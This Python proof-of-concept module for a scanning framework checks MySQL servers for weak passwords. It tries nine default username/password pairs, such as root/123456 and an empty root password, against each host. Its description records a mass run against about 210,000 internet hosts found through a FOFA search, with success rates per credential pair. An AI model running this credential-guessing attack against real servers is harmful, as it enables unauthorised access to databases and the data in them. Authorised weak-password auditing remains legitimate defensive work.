# coding:utf-8  
from socket import timeout
import requests
from lib.core.common import url_handle,get_random_ua
from lib.core.poc import POCBase
# ...
import urllib3,pymysql
urllib3.disable_warnings()

class POC(POCBase):

    _info = {
        "author" : "jijue",                      # POC作者
        "version" : "1",                    # POC版本，默认是1  
        "CreateDate" : "2022-01-01",        # POC创建时间
        "UpdateDate" : "2022-01-01",        # POC创建时间
        "PocDesc" : """
            测试计划：
                常见账号和弱口令各6个，即36种可能。拿到21万个目标中测试，预期共计发包756万个(怕是要跑到天荒地老哦)。
                所有资产切片分成21份，即10000个/份。
                在测试过程中，及时优化掉不曾出现的或出现率低的字符串，以提高测试效率
            测试记录：
                测试1，9264条:
                    root/root 20
                    root/123456 19
                    root/  4
                    root/password 2
                    admin/  6
                    admin/123456 1
                    admin/password 2
                    guest/  1
                测试2，10000条：
                    root/123456 31
                    root/root 21
                    root/  5
                    root/password 3
                    root/88888888 1
                    admin/123456 3
                    admin/  3
                测试3，7663条：
                    root/123456 25
                    root/root 9
                    root/  5
                    admin/123456 1
                    admin/  1
                    root/password 1
                。。。。。
                。。。。。测了五万个以后懒得测了，因此后续过程略
            直接说最终结果：
                root/123456 45%
                root/root 30%
                root/  8%
                admin/  6%
                root/password 3%
                admin/123456 3%
                admin/password 1%
                root/88888888 1%不到
                guest/  1%不到
                。。。
        """,                                # POC描述，写更新描述，没有就不写

        "name" : "Mysql弱口令",                        # 漏洞名称
        "VulnID" : "oFx-2022-0001",                      # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
        "AppName" : "",                     # 漏洞应用名称
        "AppVersion" : "",                  # 漏洞应用版本
        "VulnDate" : "2022-01-01",                    # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
        "VulnDesc" : """
            Mysql弱口令检测
        """,                                # 漏洞简要描述

        "fofa-dork":"""
            protocol="mysql" 
        """,                     # fofa搜索语句
        "example" : "",                     # 存在漏洞的演示url，写一个就可以了
        "exp_img" : "",                      # 先不管  
    }

    def _verify(self):
        """
        返回vuln

        存在漏洞：vuln = [True,html_source] # html_source就是页面源码  

        不存在漏洞：vuln = [False,""]
        """
        vuln = [False,""]

        # userwords = ["root","admin","administrator","guest","Zabbix","Administrator"]
        # passwords = ["root","","123456","888888","666666","88888888","password"]
        u_p  =[
            'root/123456',
            'root/root',
            'root/',
            'admin/',
            'root/password',
            'admin/123456',
            'admin/password',
            'root/88888888',
            'guest/',
        ]

        for up in u_p:
            user,pwd = up.split("/")
            try:
                """
                检测逻辑，漏洞存在则修改vuln值为True，漏洞不存在则不动
                """
                db = pymysql.connect(host=self.host,port=int(self.port),user=user,password=pwd,database="information_schema")
                cursor = db.cursor()
                cursor.execute("SELECT VERSION()")
                db.close()
                vuln = [True,"Mysql Login <title>%s</title> Success!" % (up)]
                return vuln
            except Exception as e:
                # raise e
                continue

        return vuln

    def _attack(self):
        return self._verify()